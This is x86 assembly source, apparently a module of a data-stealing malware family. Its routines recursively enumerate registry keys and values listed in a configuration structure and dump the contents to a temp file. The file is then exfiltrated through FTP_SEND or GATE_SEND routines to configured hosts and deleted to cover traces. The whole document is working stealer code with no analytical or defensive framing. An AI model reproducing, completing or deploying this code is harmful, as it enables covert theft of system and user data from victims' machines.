reg_grab_start:

RegGrabWork proc uses ebx rkey :DWORD, subkey :DWORD
 LOCAL RegIndex      :DWORD
 LOCAL s1[400h]      :BYTE
 LOCAL hLocalKey     :DWORD
 
  ;mov     ebx, dword ptr [rbuf]
  ;mov     byte ptr [ebx], 0
  push    dword ptr [subkey]
  mov     eax, dword ptr [rkey]
  .if     ( eax == HKEY_CLASSES_ROOT )
          push    offset [sHKEY_CLASSES_ROOT]
  .elseif ( eax == HKEY_CURRENT_USER )
          push    offset [sHKEY_CURRENT_USER]
  .elseif ( eax == HKEY_LOCAL_MACHINE )
          push    offset [sHKEY_LOCAL_MACHINE]
  .elseif ( eax == HKEY_USERS )
          push    offset [sHKEY_USERS]
  .endif
  push    offset reg_format_str1
  push    offset RegFormatBuf
  call    wsprintf
  add     esp, 4h*4h
  
  lstrlen, addr RegFormatBuf
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr RegFormatBuf, eax
  
  lea     eax, hLocalKey
  push    eax
  push    KEY_READ
  push    0
  push    dword ptr [subkey]
  push    dword ptr [rkey]
  call    _RegOpenKeyEx
  test    eax, eax
  jne     RegCriticalFault
  
  mov     dword ptr [RegIndex], 0
enum_reg_lp:
  mov     dword ptr [RegValNameSize], sizeof RegValName
  mov     dword ptr [RegDataSize], 0
  push    offset RegDataSize
  xor     eax, eax
  push    eax
  push    eax
  push    eax
  push    offset RegValNameSize
  push    offset RegValName
  push    dword ptr [RegIndex]
  push    dword ptr [hLocalKey]
  call    _RegEnumValue
  cmp     eax, ERROR_NO_MORE_ITEMS
  je      all_reg_done
  test    eax, eax
  jne     badval
  
  HeapAlloc, hHeap, HEAP_ZERO_MEMORY, RegDataSize
  test    eax, eax
  je      badval    
  mov     hRegHeap, eax
  
  mov     dword ptr [RegValNameSize], sizeof RegValName
  push    offset RegDataSize
  push    dword ptr [hRegHeap]
  push    offset RegType
  push    0
  push    offset RegValNameSize
  push    offset RegValName
  push    dword ptr [RegIndex]
  push    dword ptr [hLocalKey]
  call    _RegEnumValue
  test    eax, eax
  jne     badval
  
  push    dword ptr [RegType]
  push    offset RegValName
  push    offset reg_format_str2
  push    offset RegFormatBuf
  call    wsprintf
  add     esp, 4*4
  
  lstrlen, addr RegFormatBuf
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr RegFormatBuf, eax
  
  mov     ecx, dword ptr [RegDataSize]
  test    ecx, ecx
  je      reg_val_grabbed
  mov     esi, dword ptr [hRegHeap]
  reg_print_lp:
  push    ecx
  
  .if     ( RegCnt > 2*1024*1024 )
          WriteFile, hFile, hRegBuf, RegCnt, addr nw, NULL
          RtlZeroMemory, hRegBuf, 4*1024*1024
          mov     dword ptr [RegCnt], 0
  .endif
  
  xor     eax, eax
  lodsb
  push    eax
  push    offset reg_format_str0
  push    offset RegFormatBuf
  call    wsprintf
  add     esp, 3*4
  
  mov     eax, 3
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr RegFormatBuf, eax
  
  .if     ( RegType == REG_SZ ) || ( RegType == REG_EXPAND_SZ ) || ( RegType == REG_MULTI_SZ )
          
          mov     eax, 3
          mov     ecx, dword ptr [hRegBuf]
          add     ecx, dword ptr [RegCnt]
          add     dword ptr [RegCnt], eax
          RtlMoveMemory, ecx, addr unull, eax
          
  .endif
  pop     ecx
  dec     ecx
  jnz     reg_print_lp
  
  mov     eax, 2
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr crlf, eax
  
reg_val_grabbed:
  HeapFree, hHeap, 0, hRegHeap
badval:
  inc     dword ptr [RegIndex]
  jmp     enum_reg_lp
all_reg_done:
  push    dword ptr [hLocalKey]
  call    _RegCloseKey
RegCriticalFault:

  mov     eax, 2
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr crlf, eax
  
  lea     eax, hLocalKey
  push    eax
  push    KEY_READ
  push    0
  push    dword ptr [subkey]
  push    dword ptr [rkey]
  call    _RegOpenKeyEx
  test    eax, eax
  jne     RegKeyCriticalFault
  mov     dword ptr [RegIndex], 0
enum_reg_key_lp:
  mov     dword ptr [RegKeyNameSize], sizeof RegKeyName
  xor     eax, eax
  push    eax
  push    eax
  push    eax
  push    eax
  push    offset RegKeyNameSize
  push    offset RegKeyName
  push    dword ptr [RegIndex]
  push    dword ptr [hLocalKey]
  call    _RegEnumKeyEx
  cmp     eax, ERROR_NO_MORE_ITEMS
  je      all_reg_key_done
  lstrcpy, addr s1, subkey
  lstrcat, addr s1, addr sl
  lstrcat, addr s1, addr RegKeyName
  invoke  RegGrabWork, rkey, addr s1
  inc     dword ptr [RegIndex]
  jmp     enum_reg_key_lp
all_reg_key_done:
  push    dword ptr [hLocalKey]
  call    _RegCloseKey
RegKeyCriticalFault:
  ret
RegGrabWork endp

RegistryGrab proc
  VirtualAlloc, 0, 4*1024*1024, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE
  test    eax, eax
  je      reg_fatal_err
  mov     hRegBuf, eax
  mov     dword ptr [RegCnt], 0
  
  GetTempPath, sizeof TmpBuf, addr TmpBuf
  lstrlen, addr TmpBuf
  add     eax, offset TmpBuf
  mov     al, byte ptr [eax-1]
  .if     ( al != '\' )
          lstrcat, addr TmpBuf, addr sl
  .endif
  lstrcat, addr TmpBuf, addr reg_grab_fn
  lstrcpy, addr cpyfrom, addr TmpBuf
  lstrcpy, addr cpyto, addr TmpBuf
  CreateFile, addr TmpBuf, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
  cmp     eax, INVALID_HANDLE_VALUE
  je      reg_fatal_err
  mov     hFile, eax
  
  lstrlen, addr reg_header
  mov     ecx, dword ptr [hRegBuf]
  add     ecx, dword ptr [RegCnt]
  add     dword ptr [RegCnt], eax
  RtlMoveMemory, ecx, addr reg_header, eax
  
  mov     ebx, dword ptr [hRegGrabStruct]
  mov     ecx, dword ptr [ebx]
  add     ebx, 4
reg_work_lp:
  push    ecx
  mov     eax, dword ptr [ebx]
  add     ebx, 4
  mov     ecx, dword ptr [ebx]
  add     ebx, 4
  mov     edx, ebx
  add     ebx, ecx
  push    ebx
  invoke  RegGrabWork, eax, edx
  pop     ebx
  pop     ecx
  dec     ecx
  jnz     reg_work_lp
  
  .if     ( RegCnt > 0 )
          WriteFile, hFile, hRegBuf, RegCnt, addr nw, NULL
  .endif
  
  CloseHandle, hFile
  
  lstrlen, addr FTP_HOST
  .if     ( eax != 0 )
          call    FTP_SEND
  .endif
  mov     eax, dword ptr [GateHostSize]
  .if     ( eax != 0 )
          call    GATE_SEND
  .endif
  mov     eax, dword ptr [DirNameCreateLen]
  .if     ( eax != 0 )
          lstrcpy, addr TmpBuf, addr const_d
          lstrcat, addr TmpBuf, addr sl
          push    offset cpyfrom
          call    _PathFindFileName
          lstrcat, addr TmpBuf, eax
          CopyFile, addr cpyfrom, addr TmpBuf, FALSE
  .endif
  DeleteFile, addr cpyfrom
  
  VirtualFree, hRegBuf, 0, MEM_RELEASE
reg_fatal_err:
  ret
RegistryGrab endp

reg_grab_end:
